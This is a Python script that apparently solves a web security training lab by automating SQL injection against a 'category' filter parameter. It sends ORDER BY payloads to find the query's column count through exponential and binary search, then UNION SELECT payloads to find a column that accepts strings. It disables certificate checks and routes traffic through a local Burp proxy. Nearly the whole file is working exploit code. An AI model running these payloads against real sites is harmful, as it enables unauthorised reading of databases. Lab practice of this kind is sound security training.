#!/usr/bin/env python3
import re
import sys
import warnings
from typing import Optional
from urllib.parse import urljoin

from bs4 import BeautifulSoup
from requests import Response
from requests.exceptions import RequestException
from requests.sessions import Session

# Suppress insecure request warnings
warnings.filterwarnings("ignore", message="Unverified HTTPS request")

FILTER_ENDPOINT = "filter"
REQUEST_TIMEOUT = (2, 5)
BURP_PROXIES = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def send_request(
    session: Session,
    url: str,
    params: Optional[dict] = None,
    proxies: Optional[dict] = None,
) -> Optional[Response]:
    """Helper handles all HTTP communication"""
    headers = {"User-Agent": "Security-Scanner-v1", "Connection": ":close"}

    try:
        return session.get(
            url=url,
            params=params,
            headers=headers,
            timeout=REQUEST_TIMEOUT,
            proxies=proxies,
            verify=False,
        )
    except RequestException as e:
        print(f"[-] Request failed: {e}")
        return None


def is_valid_count(
    session: Session, endpoint_url: str, column_count: int, proxies: Optional[dict]
) -> bool:
    """Returns True if the server responds with HTTP 200 for the payload."""

    payload = f"Pets' ORDER BY {column_count} --"
    response = send_request(
        session, endpoint_url, {"category": payload}, proxies=proxies
    )
    return response is not None and response.status_code == 200


def find_column_count(base_url: str, proxies: Optional[dict]) -> int:
    """Uses Exponential + Binary Search to find column count"""
    session = Session()
    endpoint_url = urljoin(base_url.rstrip("/") + "/", FILTER_ENDPOINT)

    # Exponential search for upper bound
    print("[*] Finding upper bound...")
    lower_bound = 1
    upper_bound = 1
    while is_valid_count(session, endpoint_url, upper_bound, proxies):
        lower_bound = upper_bound
        upper_bound *= 2

    # Binary Search for exact count
    print(f"[*] Binary searching between {lower_bound} and {upper_bound}...")
    discovered_columns = 0
    while lower_bound <= upper_bound:
        mid = (lower_bound + upper_bound) // 2
        if is_valid_count(session, endpoint_url, mid, proxies):
            discovered_columns = mid
            lower_bound = mid + 1
        else:
            upper_bound = mid - 1
    return discovered_columns


def find_string_column(
    base_url: str, column_count: int, marker: str, proxies: Optional[dict]
) -> Optional[int]:
    """Determines which column indices are string compatible"""
    session = Session()
    endpoint_url = urljoin(base_url.rstrip("/") + "/", FILTER_ENDPOINT)

    for column_index in range(column_count):
        columns = ["NULL"] * column_count
        columns[column_index] = f"'{marker}'"
        payload = f"Pets' UNION SELECT {','.join(columns)}--"

        res = send_request(
            session, endpoint_url, {"category": payload}, proxies=proxies
        )
        if res and res.status_code == 200:
            return column_index + 1
    return None


def extract_marker_string(html: str) -> Optional[str]:
    """Extracts random string from the HTML hint banner"""
    soup = BeautifulSoup(html, "html.parser")
    hint = soup.find("p", id="hint")
    if not hint:
        return None
    # Looking for the string inside single quotes
    match = re.search(r"'([^']+)'", hint.get_text())
    return match.group(1) if match else None


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <url>")
        sys.exit(1)

    url = sys.argv[1].strip()

    print("[*] Fetching marker string from lab...")
    session = Session()
    res = send_request(session, url, proxies=BURP_PROXIES)
    if not res:
        sys.exit(1)

    marker = extract_marker_string(res.text)
    if not marker:
        print("[-] Failed to extract marker string. Is the lab active?")
        sys.exit(1)

    print(f"[+] Marker found: {marker}")
    print("[*] Determining column count...")

    col_count = find_column_count(url, BURP_PROXIES)
    if col_count <= 0:
        print("[-] Failed to determine column count")
        sys.exit(1)

    print(f"[+] Table width: {col_count} columns")
    print("[*] Probing for string-compatible column...")

    target_col = find_string_column(url, col_count, marker, BURP_PROXIES)

    if target_col:
        print(f"[!] SUCCESS: Column {target_col} is string-compatible.")
        print("[+] Lab should now be solved.")
    else:
        print("[-] No string-compatible column found.")


if __name__ == "__main__":
    main()
